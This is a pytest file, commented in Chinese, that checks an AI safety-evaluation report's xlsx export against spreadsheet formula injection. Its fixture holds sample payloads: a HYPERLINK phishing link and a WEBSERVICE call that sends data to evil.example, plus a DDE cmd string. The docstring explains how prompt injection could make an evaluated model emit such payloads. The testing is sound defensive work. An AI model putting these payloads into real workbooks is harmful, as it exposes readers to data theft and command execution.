"""M3 QE3-2 安全测试：安全评测合规报告 xlsx 公式注入防护

攻击路径复现（红→绿）：
被测模型输出是攻击者可控文本（提示注入可直接指挥模型「输出这串字符」）。
安全合规工作簿设计用途是**外发给监管/评审方**，若模型回复以 =/+/-/@ 起头，
openpyxl 会把单元格存成公式类型，评审方打开工作簿即触发执行（如
=HYPERLINK 外链钓鱼、=WEBSERVICE 数据外带、DDE 命令执行变体）。

防护口径：xlsx 证据单元格对 =/+/-/@ 起头文本前置空格，强制按文本存储；
markdown 报告无执行语义，不在本测试范围。

独立测试角色；只验证行为，不改实现。
"""
import io
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest
from openpyxl import load_workbook

from app.services import result_report
from app.services.evaluators.safety import aggregate_safety_results

pytestmark = pytest.mark.unit  # W8 分类：unit（无网络/无 DB，全部替身）


def _task():
    return SimpleNamespace(
        id="task_sec", name="合规导出安全测试", evaluation_type="safety",
        safety_config={"categories": ["prompt_injection"], "sample_source": "pack",
                        "pack": "redteam_pack_v1", "pack_version": "1.0.0",
                        "mutation": {"enabled": False}, "channels": {}},
    )


def _record():
    rows = [{
        "idx": 0, "success": True,
        "user_input": "=HYPERLINK(\"http://evil.example\",\"点此领奖\")",
        "model_output": "=WEBSERVICE(\"http://evil.example/leak?d=\"&A1)",
        "attack_category": "prompt_injection", "attack_sample_id": "pi-sec",
        "is_mutation": False, "risk_point": "公式注入",
        "safety": {"passed": False, "violation": True, "severity": "high",
                    "channels": {"judge_rubric": {"violation": True, "unavailable": False,
                                                   "reason": "=cmd|'/c calc'!A1",
                                                   "evidence": "@SUM(1)"}}},
    }]
    return SimpleNamespace(execution_number=1, status="completed", started_at=None,
                            completed_at=None, total_cost=None, error_message=None,
                            config_snapshot=None, gate_result=None,
                            result=aggregate_safety_results(rows))


@pytest.fixture()
def evidence_sheet():
    xlsx = result_report.build_safety_xlsx_export(_record(), _task())
    workbook = load_workbook(io.BytesIO(xlsx), data_only=False)
    yield workbook["违规证据"]


def _all_cells(sheet):
    for row in sheet.iter_rows():
        for cell in row:
            if cell.value is not None:
                yield cell


def test_no_formula_typed_cells(evidence_sheet):
    """全工作簿不得存在公式类型单元格（data_type='f'）"""
    formulas = [c.coordinate for c in _all_cells(evidence_sheet) if c.data_type == "f"]
    assert formulas == [], f"发现公式类型单元格: {formulas}"


def test_injection_payloads_stored_as_text(evidence_sheet):
    """攻击载荷以文本形式保留（前置空格），内容不丢——证据不能因防护而失真"""
    values = [str(c.value) for c in _all_cells(evidence_sheet)]
    joined = "\n".join(values)
    assert "HYPERLINK" in joined and "WEBSERVICE" in joined
    for value in values:
        assert not value.startswith(("=", "@")), f"未防护的注入载荷: {value!r}"


def test_markdown_export_not_affected():
    """markdown 无执行语义，载荷按原文进证据区（不前置空格）"""
    md = result_report.build_safety_markdown_export(_record(), _task()).decode("utf-8")
    assert "HYPERLINK" in md
    assert "=cmd" in md


def test_plain_dash_bullets_get_guarded_but_readable():
    """常规以 - 起头的裁判理由也被前置空格——可读性代价可接受且仍是文本"""
    record = _record()
    record.result["items"][0]["safety"]["channels"]["judge_rubric"]["reason"] = "- 已明确拒绝该请求"
    xlsx = result_report.build_safety_xlsx_export(record, _task())
    sheet = load_workbook(io.BytesIO(xlsx), data_only=False)["违规证据"]
    dash_cells = [c for c in _all_cells(sheet)
                  if isinstance(c.value, str) and c.value.startswith(" -")]
    assert dash_cells, "以 - 起头的裁判理由应存在且被前置空格防护"
    assert all(c.data_type == "s" for c in dash_cells)
